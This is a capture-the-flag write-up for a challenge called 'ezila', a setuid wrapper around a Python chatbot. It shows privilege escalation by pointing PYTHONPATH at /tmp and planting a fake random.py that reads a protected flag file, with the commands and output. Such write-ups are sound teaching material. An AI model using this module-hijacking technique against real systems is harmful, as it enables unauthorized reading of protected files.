# **Writeup - HackPackCTF**

* Category **Misc**
* Name **ezila**
* Difficulty **Easy**


## Description

BigCorp is going all in on the LLM chat-based AI craze and will soon be publicly releasing EZILA, their very own flag-protection chatbot.\n\nFor the moment, access is limited to beta testers who will use terminal shell access to invoke EZILA and make sure she will properly defend the flag.

nc cha.hackpack.club 41701

## **Solution**

you get access to a shell on a remote machine, there's a file called flag.txt in the directory `/app`, but your user has limited privileges and can't read it.

On the other hand you also have access to a setuid binary called run-ezila that runs the ezila chatbot

```
ctfuser@5642f30325fc:/app$ ls -lah
total 64K
drwxrwxr-x 1 root  root  4.0K Apr 13 02:38 .
drwxr-xr-x 1 root  root  4.0K Apr 16 14:56 ..
-rw-rw-r-- 1 ezila ezila  187 Apr 13 02:20 CREDITS.txt
-rwxr-x--- 1 ezila ezila 7.7K Apr 13 02:20 ezila.py
-r-------- 1 ezila ezila   53 Apr 13 02:37 flag.txt
-rwsr-xr-x 1 ezila ezila  17K Apr 13 02:38 run-ezila
-r-------- 1 ezila ezila  14K Apr 13 02:20 script.txt
```

apparently the permissions needed to read the flag are the same needed to read the script, so if you could get ezila to read the wrong file the challenge would be over.

let's try overriding the libraries used by python using `PYTHONPATH`, hoping the suid executable doesn't sanitize the environment before executing python,

replacing `random` with my code looks like a good idea because ezila doesn't seem to answer in a fully predictable way, so it's probably making use of random numbers

```
ctfuser@5642f30325fc:/app$ export PYTHONPATH=/tmp
ctfuser@5642f30325fc:/app$ cat <<EOF > /tmp/random.py                   
> f = open("flag.txt", "r")
> print(f.read())
> f.close()
> EOF
ctfuser@5642f30325fc:/app$ ./run-ezila 
running /app/ezila.py as uid=1000 (euid=1001)
flag{n3v3r_7ru57_a_ch@7b07_t0_cl3@n_th3_3nv1r0nm3n7}

Traceback (most recent call last):
  File "/app/ezila.py", line 237, in <module>
    main()
  File "/app/ezila.py", line 233, in main
    eliza.run()
  File "/app/ezila.py", line 216, in run
    print(self.initial())
          ^^^^^^^^^^^^^^
  File "/app/ezila.py", line 210, in initial
    return random.choice(self.initials)
           ^^^^^^^^^^^^^
AttributeError: module 'random' has no attribute 'choice'
```

here it is the flag,

remember kids, always clean the environment before escalating privileges

flag: `flag{n3v3r_7ru57_a_ch@7b07_t0_cl3@n_th3_3nv1r0nm3n7}`